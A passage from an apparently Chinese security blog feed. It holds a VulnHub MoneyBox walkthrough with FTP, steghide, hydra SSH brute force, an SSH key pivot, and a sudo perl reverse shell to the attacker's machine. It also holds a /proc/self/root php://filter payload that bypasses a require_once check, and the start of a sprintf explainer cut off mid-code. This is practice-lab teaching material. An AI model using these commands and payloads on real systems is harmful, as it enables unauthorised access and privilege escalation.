src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425231606085.png" alt="image-20250425231606085"></p><p>靶机开放了三个端口：</p><p><code>21</code>：是<code>ftp</code>服务，允许匿名登录，还有一张<code>trytofind.jpg</code>图片</p><p><code>22</code>：是<code>ssh</code>服务有一些<code>key</code></p><p><code>80</code>：是<code>http</code>服务存在一个网页<code>Title：MoneyBox</code></p><h1 id="FTP服务探测"><a href="#FTP服务探测" class="headerlink" title="FTP服务探测"></a>FTP服务探测</h1><p>尝试进行匿名登录FTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># FTP的匿名登录一般有三种：</span><br>1、 用户名：anonymous 密码：anonymous 或者 为空<br>2、 用户名：FTP 密码：FTP 或者为空<br>3、 用户名：USER 密码：pass<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425232151081.png" alt="image-20250425232151081"></p><p>成功登录，先看看有什么东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425232255654.png" alt="image-20250425232255654"></p><p>有一个 JPG 图片，使用<code>get</code>命令下载图片</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> trytofind.jpg<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/trytofind.jpg" alt="trytofind"></p><p>看到图片想到CTF的图片隐写，使用<code>steghide</code>工具查看图片详细信息</p><p><code>steghide</code>安装方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install steghide<br></code></pre></td></tr></table></figure><p>查看图片信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">steghide</span> <span class="hljs-literal">info</span> trytofind.jpg<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425232905214.png" alt="image-20250425232905214"></p><p>发现需要密码，接下来需要找密码</p><h1 id="HTTP服务探测"><a href="#HTTP服务探测" class="headerlink" title="HTTP服务探测"></a>HTTP服务探测</h1><p>直接访问目标靶机的IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233220536.png" alt="image-20250425233220536"></p><p>看网站先看源码，不过没有有用的东西</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233302824.png" alt="image-20250425233302824"></p><p>那就直接用<code>dirsearch</code>扫描目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.1.102/ -e *<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233509276.png" alt="image-20250425233509276"></p><p>可以扫出个301重定向的<code>/blogs</code>页面，访问看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.102/blogs<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233628440.png" alt="image-20250425233628440"></p><p>还是先查看源码</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233953950.png" alt="image-20250425233953950"></p><p>在最后可以发现一个<code>hint</code>，访问<code>/S3cr3t-T3xt</code>看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.102/S3cr3t-T3xt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233827255.png" alt="image-20250425233827255"></p><p>继续看源码</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233859495.png" alt="image-20250425233859495"></p><p>得到密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 密码</span><br>3xtr4ctd4t4<br></code></pre></td></tr></table></figure><p>重新再去看看图片</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide info trytofind.jpg<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425234146632.png" alt="image-20250425234146632"></p><p>发现有一个<code>data.txt</code>文件，使用<code>steghide</code>提取出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf trytofind.jpg -p 3xtr4ctd4t4<br></code></pre></td></tr></table></figure><ul><li><code>extract</code>：指定要执行的操作为提取隐藏数据</li><li><code>-sf</code>：指定源文件为 <code>trytofind.jpg</code>，这是一个包含隐藏数据的图像文件</li><li><code>-p</code>：指定用于解密隐藏数据的密码。在这个例子中，密码为 3xtr4ctd4t4</li></ul><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425234441416.png" alt="image-20250425234441416"></p><p>查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> data.txt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425234600624.png" alt="image-20250425234600624"></p><p>AI翻译一下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">你好…… renu<br>我要告诉你一些重要的事。你的密码太弱了，所以更改一下你的密码吧。<br>别小看这件事……<br></code></pre></td></tr></table></figure><h1 id="SSH服务探测"><a href="#SSH服务探测" class="headerlink" title="SSH服务探测"></a>SSH服务探测</h1><h3 id="使用hydra爆破密码"><a href="#使用hydra爆破密码" class="headerlink" title="使用hydra爆破密码"></a>使用<code>hydra</code>爆破密码</h3><p>在<code>data.txt</code>文件中得到的用户名<code>renu</code>就是<code>ssh</code>服务的，因为就剩这一个服务了</p><p>提示密码太弱，使用<code>hydra</code>工具对<code>ssh</code>服务进行弱口令爆破</p><p>在kali的<code>/usr/share/wordlists/</code>目录下有一个字典</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425235415886.png" alt="image-20250425235415886"></p><p>将其解压缩</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425235553250.png" alt="image-20250425235553250"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l renu -P rockyou.txt 192.168.1.102 ssh<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425235646192.png" alt="image-20250425235646192"></p><p>得到密码是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">987654321<br></code></pre></td></tr></table></figure><h3 id="SSH远程登录"><a href="#SSH远程登录" class="headerlink" title="SSH远程登录"></a><code>SSH</code>远程登录</h3><p>直接<code>ssh</code>远程登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh renu@192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425235835395.png" alt="image-20250425235835395"></p><p>成功登录，先看看有什么东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425235945856.png" alt="image-20250425235945856"></p><p>发现有个<code>user1.txt</code>文件，查看得到第一个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> user1.txt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426000034742.png" alt="image-20250426000034742"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">us3r1&#123;F14g:0ku74tbd3777y4&#125;<br></code></pre></td></tr></table></figure><p>还有一个<code>ftp</code>目录，里面就是刚才在FTP服务得到的图片</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426000206950.png" alt="image-20250426000206950"></p><p>返回上一级目录看看</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426000351201.png" alt="image-20250426000351201"></p><p>发现还有一个<code>lily</code>目录，说明还存在一个<code>lily</code>用户，进入目录看看，得到第二个flag</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426000506824.png" alt="image-20250426000506824"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">us3r&#123;F14g:tr5827r5wu6nklao&#125;<br></code></pre></td></tr></table></figure><h3 id="切换为lily用户"><a href="#切换为lily用户" class="headerlink" title="切换为lily用户"></a>切换为<code>lily</code>用户</h3><p>查看一下历史命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426002159693.png" alt="image-20250426002159693"></p><blockquote><p>猜测<code>ssh</code>登录的账户lily为本机的<code>lily</code>用户，那么<code>SSH</code>公钥配置操作就是在本机上进行的，根据<code>SSH</code>公钥工作机制，如果<code>renu</code>用户进行了<code>ssh-keygen -t rsa</code>操作，会在<code>renu</code>的<code>~/.ssh/</code>中生成<code>id_rsa</code>和<code>id_rsa.pub</code>文件</p></blockquote><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426001618917.png" alt="image-20250426001618917"></p><blockquote><p>同时，如果<code>renu</code>用户进行了<code>ssh-copy-id lily@192.168.43.80</code>操作，将会把刚才生成的<code>id_rsa.pub</code>拷贝到<code>192.168.43.80</code>主机上的lily账户<code>～/.ssh/authorized_keys</code>文件中。如果<code>192.168.43.80</code>上的lily用户就是本机的lily用户，那么<code>lily</code>用户下<code>~/.ssh/authorized_keys</code>文件中的公钥应该与<code>renu</code>生成的<code>id_rsa.pub</code>公钥一致</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> id_rsa.pub<br><span class="hljs-built_in">cd</span> /home/lily/.ssh/<br><span class="hljs-built_in">cat</span> authorized_keys<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426002453872.png" alt="image-20250426002453872"></p><p>可以发现两个是一模一样，那么<code>renu</code>用户可以通过SSH公钥验证的方式登陆到本机的lily的账户上</p><p>尝试直接<code>su</code>到<code>lily</code>用户，但是需要密码</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426002935648.png" alt="image-20250426002935648"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i id_rsa lily@192.168.1.102<br><span class="hljs-comment"># -i 选项，用于指定私钥文件 id_rsa。</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426003043780.png" alt="image-20250426003043780"></p><h3 id="提权为root"><a href="#提权为root" class="headerlink" title="提权为root"></a>提权为<code>root</code></h3><p>成功登录，尝试进行提权，但是直接使用<code>su</code>还是需要密码</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426003329930.png" alt="image-20250426003329930"></p><p>查看历史命令，发现<code>lily</code>用户编辑了<code>sudoers</code>，并且查找了一些具有<code>suid</code>权限的文件，执行了<code>sudo -l</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426003425435.png" alt="image-20250426003425435"></p><p>看看当前用户可用的<code>sudo</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426003730564.png" alt="image-20250426003730564"></p><p>发现可以使用<code>perl</code>命令</p><p>参考提权网站：<a href="https://gtfobins.github.io/gtfobins/perl/">https://gtfobins.github.io/gtfobins/perl/</a></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426003845131.png" alt="image-20250426003845131"></p><p>可以直接提权，也可以反弹<code>shell</code></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹<code>shell</code></h4><p>在<code>kali</code>监听<code>2333</code>端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426004313655.png" alt="image-20250426004313655"></p><p>靶机输入以下命令，加上<code>sudo</code>可以提升权限执行<code>perl</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;192.168.1.103&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426004720854.png" alt="image-20250426004720854"></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426004801020.png" alt="image-20250426004801020"></p><p>成功反弹<code>shell</code>，并且是<code>root</code>权限，在<code>/root</code>目录下找到隐藏文件<code>.root.txt</code>得到<code>rootflag</code></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426004839093.png" alt="image-20250426004839093"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r00t&#123;H4ckth3p14n3t&#125;<br></code></pre></td></tr></table></figure><h4 id="直接用perl提权"><a href="#直接用perl提权" class="headerlink" title="直接用perl提权"></a>直接用<code>perl</code>提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426005156575.png" alt="image-20250426005156575"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r00t&#123;H4ckth3p14n3t&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透 打靶 复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>符号链接突破目录限制</title>
    <link href="/2025/04/25/%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E7%AA%81%E7%A0%B4%E7%9B%AE%E5%BD%95%E9%99%90%E5%88%B6/"/>
    <url>/2025/04/25/%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E7%AA%81%E7%A0%B4%E7%9B%AE%E5%BD%95%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;starven_secret.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;还想非预期?&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在 PHP 中，<code>require_once</code> 和 <code>include_once</code> 在调用时PHP 会先检查一个内部的记录结构（可近似理解为哈希表，存储已包含文件的路径信息），看要包含的文件路径是否已经存在于其中。如果存在，就不再重复执行包含操作；如果不存在，才会将文件内容包含进来，并把该文件的路径记录到这个结构中</p><h4 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a><strong>小知识点</strong></h4><p><code>/proc/self</code>：在 Linux 系统中，&#x2F;proc 是一个虚拟文件系统，存储着当前系统运行进程的相关信息，&#x2F;proc&#x2F;self是一个特殊的符号链接，它会动态指向当前正在执行进程对应的 <code>/proc/</code> 下的具体进程目录（目录名是进程 ID，即 <code>/proc/pid/</code> ）。例如，若当前进程 ID 是 <code>1234</code> ，那么 <code>/proc/self</code> 就等同于 <code>/proc/1234/</code></p><p><code>/proc/self/root</code>：它也是一个符号链接，指向系统的根目录（<code>/</code> ） 。在一些受限制的环境（如容器环境 ）中，通过这个符号链接可以突破当前目录限制，访问到系统根目录下的文件</p><h4 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a><strong>符号链接</strong></h4><p>符号链接也叫做软连接，是一类特殊文件，其本质是包含指向其他文件或目录的引用的文本文件，该引用以绝对路径或相对路径形式存在</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>starven_secret.php<br></code></pre></td></tr></table></figure><p>利用符号链接<code>/proc/self/root</code>突破目录限制，<code>/proc/self/root</code>作为指向根目录的符号链接，多次使用可突破代码可能存在的当前目录范围限制</p><p>可以利用<code>/proc/self/root</code>，可以构造出指向任意文件的路径，即使代码没用直接访问<code>/var/www/html/starven_secret.php</code>的权限，也可以通过<code>/proc/self/root</code>逐步导航到目标文件所在位置，从而绕过可能存在的目录访问限制，实现对敏感文件的访问</p>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sprintf漏洞</title>
    <link href="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="sprintf函数"><a href="#sprintf函数" class="headerlink" title="sprintf函数"></a><code>sprintf</code>函数</h1><h3 id="函数功能"><a href="#函数功能" class="headerlink" title="函数功能"></a>函数功能</h3><p><code>sprintf</code>是 PHP 中一个格式化字符串的函数，功能是根据指定的格式化字符串，将一系列参数转换并格式化为一个新的字符串</p><h3 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">sprintf</span>(format, arg1, arg2,...)<br></code></pre></td></tr></table></figure><ul><li><code>format</code>：是必需参数，规定字符串以及如何格式化其中的变量，如果 <code>format</code> 字符串中不包含任何占位符（如 <code>%s</code>、<code>%d</code> 等），那么可以不需要额外的 <code>arg</code> 参数</li><li><code>arg1, arg2,...</code>：可选参数，要被插入到<code>format</code>字符串中指定位置的参数，可以有多个</li></ul><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">format</td><td align="left">必需。规定字符串以及如何格式化其中的变量。可能的格式值：<br/><br/>%% - 返回一个百分号 %<br/><br/>%b - 二进制数<br/><br/>%c - ASCII 值对应的字符<br/><br/>%d - 包含正负号的十进制数（负数、0、正数）<br/><br/>%e - 使用小写的科学计数法（例如 1.2e+2）<br/><br/>%E - 使用大写的科学计数法（例如 1.2E+2）<br/><br/>%u - 不包含正负号的十进制数（大于等于 0）<br/><br/>%f - 浮点数（本地设置）<br/><br/>%F - 浮点数（非本地设置）<br/><br/>%g - 较短的 %e 和 %f<br/><br/>%G - 较短的 %E 和 %f<br/><br/>%o - 八进制数<br/><br/>%s - 字符串<br/><br/>%x - 十六进制数（小写字母）<br/><br/>%X - 十六进制数（大写字母）<br/><br/>附加的格式值。必需放置在 % 和字母之间（例如 %.2f）：<br/><br/>+ （在数字前面加上 + 或 - 来定义数字的正负性。默认情况下，只有负数才做标记，正数不做标记）<br/><br/>‘ （规定使用什么作为填充，默认是空格。它必须与宽度指定器一起使用。例如：%’x20s（使用 “x” 作为填充））<br/><br/>- （左调整变量值）<br/><br/>[0-9] （规定变量值的最小宽度）<br/><br/>.[0-9] （规定小数位数或最大字符串长度）<br/><br/>注释：如果使用多个上述的格式值，它们必须按照以上顺序使用<br/></td></tr><tr><td align="center">arg1</td><td align="left">如果<code>format</code>中有占位符（如 <code>%s</code>、<code>%d</code> 等），这个参数是必需的，规定插到 <em>format</em> 字符串中第一个 % 符号处的参数</td></tr><tr><td align="center">arg2</td><td align="left">可选，规定插到 <em>format</em> 字符串中第二个 % 符号处的参数</td></tr></tbody></table><h3 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h3><ul><li><strong>格式化数字</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$num</span> = <span class="hljs-number">123.456</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%.2f&quot;</span>, <span class="hljs-variable">$num</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-comment">// 输出 123.46，将数字格式化为保留两位小数的字符串</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331135554907.png" alt="image-20250331135554907"></p><ul><li><strong>拼接字符串和变量</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;John&quot;</span>;<br><span class="hljs-variable">$age</span> = <span class="hljs-number">30</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;My name is %s and I&#x27;m %d years old.&quot;</span>, <span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-comment">// 输出 My name is John and I&#x27;m 30 years old.</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331135700220.png" alt="image-20250331135700220"></p><ul><li><strong>格式化日期</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$timestamp</span> = <span class="hljs-title function_ invoke__">time</span>();<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%02d-%02d-%d&quot;</span>, <span class="hljs-title function_ invoke__">date</span>(<span 